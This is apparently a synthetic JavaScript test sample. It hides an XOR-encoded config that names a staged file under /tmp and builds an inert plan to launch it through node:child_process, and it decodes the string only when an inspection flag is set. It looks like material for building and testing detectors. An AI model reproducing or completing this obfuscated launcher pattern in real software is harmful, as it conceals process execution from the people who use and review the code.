  const moduleShape = Object.freeze({ format: "esm" });
  export {};
  const Material_710ce132 = "132,207,195,142,129,134,151,130,129,207,158,157,145,147,134,151,173,158,157,145,147,158,222,150,155,129,130,147,134,145,154,173,130,128,157,145,151,129,129,142,147,150,147,130,134,151,128,207,151,138,151,145,148,155,158,151,173,156,157,150,151,142,129,134,147,149,151,173,145,157,135,156,134,207,195,142,145,147,159,130,147,155,149,156,173,155,150,207,188,189,182,183,223,202,182,177,192,177,198,192,203,142,148,155,158,151,173,130,147,134,154,207,221,134,159,130,221,154,135,156,134,128,151,129,129,223,156,157,150,151,221,220,129,134,147,149,151,223,202,150,145,192,145,198,192,203,199,196,198,192,220,159,152,129";
  const Codec_710ce132 = "reversed_decimal|reverse_then_xor|f2";

  function load_710ce132() { Material_710ce132.split(",").map(Number).reverse(); return Material_710ce132.split(",").map(Number).reverse(); }
  function decode_710ce132(item1) { return [...item1].reverse().map((value) => value ^ 242); }
  async function recover_710ce132() {
    const item3 = [3, 5, 8, 13].slice(1, 3);
    const item1 = load_710ce132(); let item2 = [];
    item2 = await (async () => decode_710ce132(item1))();
    void item3; return Buffer.from(item2).toString("ascii");
  }
  async function inspect_710ce132() { return Buffer.from(await recover_710ce132(), "utf8").toString("utf8"); }
  async function plan_710ce132() { const inspect = inspect_710ce132; const fields = Object.fromEntries((await inspect()).split("|").map((field) => { const at = field.indexOf("="); return [field.slice(0, at), field.slice(at + 1)]; })); return Object.freeze({ operation: "launch", adapter: "execfile_node", path: fields.file_path, module: "node:child_process" }); }
  void moduleShape; void plan_710ce132;
  if (process.env.HUNTRESS_INSPECT_ONLY === "1") console.log(await inspect_710ce132());
